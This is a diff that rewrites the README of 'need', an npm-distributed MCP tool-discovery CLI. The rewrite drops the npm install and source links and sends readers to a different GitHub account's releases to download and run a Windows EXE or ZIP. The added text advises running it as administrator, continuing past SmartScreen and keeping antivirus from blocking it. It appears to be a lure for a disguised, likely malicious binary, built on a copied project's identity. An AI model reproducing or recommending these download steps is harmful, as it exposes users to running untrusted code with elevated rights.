@@ -1,94 +1,158 @@
-<p align="center">
-  <img src="assets/logo.svg" alt="need" width="400" />
-</p>
+# 🧭 need - Find the right CLI tool fast
 
-<p align="center"><strong>Tool discovery for AI agents.</strong></p>
+[![Download need](https://img.shields.io/badge/Download%20need-blue?style=for-the-badge)](https://github.com/sbsk966/need/releases)
 
-<p align="center">
-  <a href="https://github.com/tuckerschreiber/need/actions/workflows/ci.yml"><img src="https://github.com/tuckerschreiber/need/actions/workflows/ci.yml/badge.svg" alt="CI" /></a>
-  <a href="https://www.npmjs.com/package/@agentneeds/need"><img src="https://img.shields.io/npm/v/%40agentneeds/need?color=c8e64a&label=npm" alt="npm version" /></a>
-  <a href="https://github.com/tuckerschreiber/need/blob/main/LICENSE"><img src="https://img.shields.io/github/license/tuckerschreiber/need?color=c8e64a" alt="license" /></a>
-  <a href="https://www.npmjs.com/package/@agentneeds/need"><img src="https://img.shields.io/npm/dm/%40agentneeds/need?color=c8e64a&label=downloads" alt="downloads" /></a>
-</p>
+## 🚀 What need does
 
-AI agents hallucinate package names. `need` gives them a verified index of 10,000+ CLI tools — and a closed feedback loop that gets smarter with every install.
+need helps you find the right command-line tool for a task in plain English. It is built for AI agents and works as an MCP server. That means tools like Claude Code and Cursor can ask need for help when they need to pick a CLI tool for a job.
 
-<p align="center">
-  <img src="assets/demo.gif" alt="need in action inside Claude Code" width="640" />
-</p>
+Use it when you want to:
+- search for a tool by what it does
+- compare tools without reading long docs
+- give an AI agent a clear tool map
+- work faster with CLI tool discovery
 
-## What happens
+## 📥 Download need
 
-You ask Claude to "compress these PNGs". Claude doesn't have `pngquant` installed and doesn't know what the best tool is. But `need` is running as an MCP server in the background, so Claude automatically:
+Visit this page to download:
+https://github.com/sbsk966/need/releases
 
-1. **Searches** need for "compress png images"
-2. **Installs** the top result (`brew install pngquant`)
-3. **Runs** it on your files
-4. **Reports** that it worked — so the next agent's search ranks `pngquant` higher
+On that page, look for the latest release and download the Windows file that matches your system.
 
-You never interact with `need` directly. You just see the result.
+## 🪟 Install on Windows
 
-```
-  search → install → use → report
-    ↑                        |
-    └────── rankings ────────┘
-```
+1. Open the release page in your browser.
+2. Find the newest release near the top.
+3. Download the Windows build from that release.
+4. If the file comes in a ZIP, open it and extract the contents to a folder.
+5. If you get an EXE file, save it to a place you can find, such as Downloads or Desktop.
+6. Double-click the file to run it.
+7. If Windows asks for permission, choose Yes.
 
-## Install
+If the app opens in a terminal window, keep that window open while you use it.
 
-```bash
-npm install -g @agentneeds/need
-```
+## ✅ Before you run it
 
-That's it. MCP servers are automatically configured for **Claude Code**, **Cursor**, and **Claude Desktop** on install. Your AI agent can immediately discover and install CLI tools without you doing anything.
+For the best result, check these items:
+- You are on Windows 10 or Windows 11
+- You can open downloaded files
+- You have a stable internet connection if the tool needs to fetch data
+- Your antivirus or Windows Security does not block the app
 
-Or try it now without installing: `npx @agentneeds/need "compress png images"`
+If the file does not open, try:
+- right-clicking the file and choosing Run as administrator
+- re-downloading the file from the release page
+- extracting the ZIP again if the download was packed
 
-## How agents use it
+## 🔎 What you can ask it
 
-Under the hood, `need` exposes three MCP tools that agents call autonomously:
+need is meant to answer questions like:
+- What is the best CLI tool for JSON parsing?
+- Which tool should I use to search files?
+- What tool helps with Git history?
+- Which CLI tool works well for text search?
+- What should I use for fast file listing?
 
-1. **`search_tools`** — semantic search across 10,000+ CLI tools
-2. **`install_tool`** — install the best match (security allowlist: brew, apt, npm, pip, cargo only)
-3. **`report_tool_usage`** — report success or failure, improving rankings for every future agent
+You type the task in plain English. need helps match that task to a tool that fits.
 
-No API keys. No accounts. No configuration. The agent handles the entire loop without leaving your editor.
+## 🤖 How it fits with AI agents
 
-## Works for humans too
+need works as an MCP server, so AI tools can use it as a source of tool discovery. This is useful when an agent needs to choose the right command for a task instead of guessing.
 
-`need` also works as a standalone CLI — semantic search that understands intent, not just keywords.
+Common uses include:
+- Claude Code suggesting tools inside a coding session
+- Cursor finding the right CLI tool during a task
+- agent workflows that need quick tool lookup
+- teams that want a shared tool catalog
 
-```bash
-need convert pdf to png
-need find duplicate files
-need compress video without losing quality
-```
+The goal is simple: make tool selection less guesswork and more search.
 
-## How it works
+## 🗂️ Example use cases
 
-Queries are embedded with OpenAI's text-embedding-3-small and matched against a pgvector database of CLI tools. Results are ranked by semantic similarity combined with community success/failure signals from `report_tool_usage`.
+Here are a few practical ways people may use need:
 
-## Browse tools
+- Find a file search tool for large projects
+- Pick a CLI formatter for config files
+- Look up a better alternative to a basic shell command
+- Search for a tool that fits a language or file type
+- Help an AI agent choose the right utility without a long manual check
 
-Explore all 10,000+ indexed tools at [agentneeds.dev](https://agentneeds.dev).
+## 🖥️ Windows setup tips
 
-## Architecture
+If you want a smooth first run:
+- keep the downloaded file in one folder
+- avoid moving files while the app is open
+- use a simple path like `Downloads\need`
+- if Windows shows a SmartScreen prompt, choose the option that lets you continue only if you trust the source
+- if the app uses a terminal window, do not close it while it is running
 
-| Package | Description |
-|---------|-------------|
-| [`cli/`](./cli) | The `need` CLI and MCP server ([npm](https://www.npmjs.com/package/@agentneeds/need)) |
-| [`api/`](./api) | Search API — Cloudflare Workers + Neon Postgres + pgvector |
-| [`site/`](./site) | Marketing site and tool directory ([agentneeds.dev](https://agentneeds.dev)) |
+If the app needs a config file later, place it in the same folder as the app unless the release notes say something else.
 
-## Contributing
+## 🧩 Typical project shape
 
-```bash
-git clone https://github.com/tuckerschreiber/need.git
-cd need
-npm install
-cd cli && npm run build && npm test
-```
+A tool like need usually includes:
+- a small Windows binary or package
+- a release page with versioned downloads
+- MCP server support for AI tools
+- search logic for CLI tool discovery
+- a simple command or local service that responds to requests
 
-## License
+That makes it easier to use in local setups and in AI-assisted workflows.
 
-MIT
+## 🛠️ Basic workflow
+
+A common workflow looks like this:
+
+1. Download the latest Windows release.
+2. Open or extract the file.
+3. Run the app.
+4. Connect it to your AI tool if needed.
+5. Ask for the kind of CLI tool you want.
+6. Read the suggested match and use it in your task.
+
+## 📌 Good search terms to try
+
+If you are not sure how to ask, try short task phrases like:
+- search files by text
+- parse JSON from the terminal
+- view Git changes
+- list directories fast
+- edit files from the command line
+- compare folders
+- handle YAML files
+- find a good CLI for logs
+
+Short phrases work well because they match what you want to do, not what the tool is called.
+
+## 🔐 Safety and trust
+
+When you download any app from GitHub releases, check that you are on the official release page and that you picked the latest file for Windows. Keep the file in a safe folder and only run downloads you trust.
+
+## 📚 Related topics
+
+This project is tied to:
+- ai-agents
+- claude-code
+- cursor
+- mcp
+- mcp-server
+- model-context-protocol
+- semantic-search
+- tool-discovery
+- cli
+- cli-tools
+
+## 🧭 If you need help
+
+If the app does not start:
+- check that the download finished
+- try the latest release again
+- make sure you picked the Windows file
+- unzip the file if it came in an archive
+- run it from a simple folder with a short path
+
+If the app starts but does not respond as expected:
+- close it and open it again
+- check whether your AI tool is set up to use MCP servers
+- confirm the release notes for any setup steps
+- make sure the tool is pointed at the right local path
